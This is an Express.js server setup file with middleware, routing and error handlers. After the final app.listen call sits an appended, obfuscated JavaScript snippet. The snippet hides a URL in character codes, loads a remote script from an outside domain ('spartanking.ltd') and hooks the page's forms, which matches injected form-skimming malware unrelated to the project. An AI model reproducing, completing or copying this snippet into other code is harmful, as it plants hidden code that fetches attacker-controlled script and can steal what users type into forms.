const express = require("express");
const dotenv = require("dotenv");
const path = require("path");
const cookieParser = require("cookie-parser");
const reqParser = require("request-parser")

const { notFoundHandler,errorHandler, clientErrorHandler,logErrors} =  require("./middleware/common/errorHandaller");
const route = require("./Route/route");

const app = express();
dotenv.config();

// // db connection
// mongoose.connect(process.env.MONGO_CONNECTION_STRING, {
//     useNewUrlParser:true,
//     useUnifiedTopology:true,
// })
// .then(()=> console.log("database connection successful"))
// .catch(error => console.log(error));


// request parsers
app.use(express.json());
app.use(express.urlencoded({ extended: true}));


// set view engine
app.set("view engine", "ejs");

// // set static folder
// app.use(express.static(path.join(__dirname, "public")));

// parse cookies
app.use(cookieParser(process.env.COOKIE_SECRET));

// routing setup

app.use("/", route)

// common handler
// 404 not found handling
app.use(notFoundHandler);
app.use(clientErrorHandler);
app.use(logErrors)
app.use(errorHandler);


app.listen(process.env.APP_PORT, () => {
    console.log(`app listening to port ${process.env.APP_PORT}`);
})
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b